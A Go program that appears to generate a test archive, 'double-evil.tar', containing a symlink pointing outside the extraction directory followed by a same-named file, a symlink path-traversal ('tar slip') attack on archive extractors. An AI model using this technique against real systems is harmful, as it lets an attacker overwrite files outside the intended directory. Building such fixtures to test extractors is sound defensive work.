package main

import (
	"archive/tar"
	"log"
	"os"
	"time"
)

func main() {
	// Create a buffer to write our archive to.
	fw, err := os.Create("double-evil.tar")
	if nil != err {
		log.Fatal(err)
		return
	}

	// Create a new tar archive.
	w := tar.NewWriter(fw)

	// Write the evil symlink, it points outside of the target directory
	h := &tar.Header{
		Name:     "bad/file.txt",
		Typeflag: 2,
		Linkname: "../../badfile.txt",
		ModTime:  time.Now(),
	}

	err = w.WriteHeader(h)

	if err != nil {
		log.Fatal(err)
	}

	// Write safe files to the archive.
	var files = []struct {
		Name, Body string
	}{
		{"goodfile.txt", "hello world"},
		{"morefile.txt", "hello world"},
		{"bad/file.txt", "Mwa-ha-ha"},
	}
	for _, file := range files {
		h := &tar.Header{
			Name:     file.Name,
			Typeflag: 0,
			Size:     int64(len(file.Body)),
			ModTime:  time.Now(),
		}
		err := w.WriteHeader(h)
		if err != nil {
			log.Fatal(err)
		}
		_, err = w.Write([]byte(file.Body))

		if err != nil {
			log.Fatal(err)
		}
	}

	// Close the in-memory archive so that it writes trailing data
	err = w.Close()
	if err != nil {
		log.Fatal(err)
	}
	// close the on-disk archive so that it flushes all bytes
	if err = fw.Close(); err != nil {
		log.Fatal(err)
		return
	}
}
